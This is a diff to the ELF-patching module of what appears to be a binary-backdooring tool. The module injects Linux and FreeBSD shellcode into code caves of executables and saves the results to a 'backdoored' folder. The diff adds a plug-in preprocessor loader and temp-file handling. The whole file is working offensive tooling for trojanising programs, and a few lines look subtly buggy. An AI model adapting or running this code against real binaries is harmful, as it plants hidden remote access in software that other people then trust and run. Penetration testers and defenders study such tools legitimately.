@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 '''
 
-Copyright (c) 2013-2015, Joshua Pitts
+Copyright (c) 2013-2016, Joshua Pitts
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without modification,
@@ -35,6 +35,7 @@ POSSIBILITY OF SUCH DAMAGE.
 import struct
 import os
 import shutil
+import tempfile
 from intel.LinuxIntelELF32 import linux_elfI32_shellcode
 from intel.LinuxIntelELF64 import linux_elfI64_shellcode
 from intel.FreeBSDIntelELF32 import freebsd_elfI32_shellcode
@@ -94,7 +95,7 @@ class elfbin():
     """
     def __init__(self, FILE, OUTPUT=None, SHELL=None, HOST="127.0.0.1", PORT=8888,
                  SUPPORT_CHECK=False, FIND_CAVES=False, SHELL_LEN=70,
-                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE="ALL"):
+                 SUPPLIED_SHELLCODE=None, IMAGE_TYPE="ALL", PREPROCESS=False):
         #print FILE
         self.FILE = FILE
         self.OUTPUT = OUTPUT
@@ -108,6 +109,10 @@ class elfbin():
         self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
         self.IMAGE_TYPE = IMAGE_TYPE
         self.shellcode_vaddr = 0x0
+        self.PREPROCESS = PREPROCESS
+        self.ORIGINAL_FILE = self.FILE
+        self.tmp_file = None
+        self.keep_temp = False
         self.file_size = os.path.getsize(self.FILE)
         self.supported_types = {0x00:    # System V
                                 [[0x01,  # 32bit
@@ -239,6 +244,85 @@ class elfbin():
                     print str(e)
         print "[*] Total of %s caves found" % len(caveTracker)
 
+    def loadthis(self, amod):
+        section = amod.split('.')
+        mod = ".".join(section[:-1])
+        amod = __import__(mod)
+        for item in section[1:]:
+            amod = getattr(amod, item)
+        return amod
+
+    def preprocess(self):
+        # files in directory
+        ignore = ['__init__.py']
+
+        for afile in os.listdir("./preprocessor"):
+            if afile in ignore:
+                continue
+            if ".pyc" in afile:
+                continue
+            
+            if len(afile.split(".")) > 2:
+                print "!" * 50
+                print "\t[!] Make sure there are no '.' in your preprocessor filename:", afile
+                print "!" * 50
+                
+                return False
+            
+            name = "preprocessor." +  afile.strip(".py")
+            
+            preprocessor_name = __import__( name, fromlist=[''])
+            
+            if preprocessor_name.enabled is True:
+                print "[*] Executing preprocessor:", afile.strip(".py")
+            else:
+                continue
+
+            if preprocessor_name.file_format.lower() in ['elf', 'all']: #'elf', 'macho', 'mach-o']:
+                print '[*] Running preprocessor', afile.strip(".py"), "against", preprocessor_name.file_format, "formats"
+            else:
+                continue
+            
+            # Allow if any processors to keep it 
+            if self.keep_temp is False:
+                self.keep_temp = preprocessor_name.keep_temp
+            
+            # create tempfile here always
+            
+            if self.tmp_file == None:
+                self.tmp_file = tempfile.NamedTemporaryFile()
+                self.tmp_file.write(open(self.FILE, 'rb').read())
+                self.tmp_file.seek(0)
+                print "[*] Creating temp file:", self.tmp_file.name
+            else:
+                print "[*] Using existing tempfile from prior preprocessor"
+            
+            load_name = name +  ".preprocessor"
+            preproc = self.loadthis(load_name)
+            
+            m = preproc(self)
+            
+            print "=" * 50
+            
+            # execute preprocessor
+            result = m.run()
+            
+            if result is False:
+                print "[!] Preprocessor Failure :("
+
+            print "=" * 50
+            
+            # After running push it to BDF.
+            
+            self.FILE = self.tmp_file.name[:]
+    
+            # check for support after each modification
+            if preprocessor_name.recheck_support is True:
+                issupported = self.support_check()
+                if issupported is False:
+                    print self.FILE, "is not supported."
+                    return False                
+
     def set_shells(self):
         """
         This function sets the shellcode.
@@ -367,6 +451,8 @@ class elfbin():
         while True:
             j = self.bin_file.read(1)
             if len(j) == 0:
+                break
+            elif j == "\x00":
                 break
             else:
                 name += j
@@ -559,11 +645,21 @@ class elfbin():
         '''
 
         self.support_check()
+        
         if self.supported is False:
             print "[!] ELF Binary not supported"
             return False
 
+        gather_result = self.gather_file_info()
+        if gather_result is False:
+            print "[!] Are you fuzzing?"
+            return False
+        
         self.output_options()
+
+        if self.PREPROCESS is True:
+            print "True"
+            self.preprocess()
 
         if not os.path.exists("backdoored"):
             os.makedirs("backdoored")
@@ -575,12 +671,6 @@ class elfbin():
 
         shutil.copy2(self.FILE, self.backdoorfile)
 
-
-        gather_result = self.gather_file_info()
-        if gather_result is False:
-            print "[!] Are you fuzzing?"
-            return False
-        
         print "[*] Getting shellcode length"
 
         resultShell = self.set_shells()
@@ -775,7 +865,21 @@ class elfbin():
             self.JMPtoCodeAddress = self.shellcode_vaddr - self.e_entry - 5
 
         self.bin_file.close()
+
         print "[!] Patching Complete"
+
+        if self.tmp_file != None:
+        
+            if self.keep_temp is True:
+                # tmpfilename_orginalname.exe
+                print "[*] Saving TempFile to:", os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE 
+                shutil.copy2(self.FILE, os.path.basename(self.FILE) + '_' + self.ORIGINAL_FILE )
+            try:
+                shutil.rmtree(self.tmp_file.name)
+            except: # OSError:
+                pass
+                #print "[*] TempFile already removed."
+
         return True
 
 # END elfbin clas
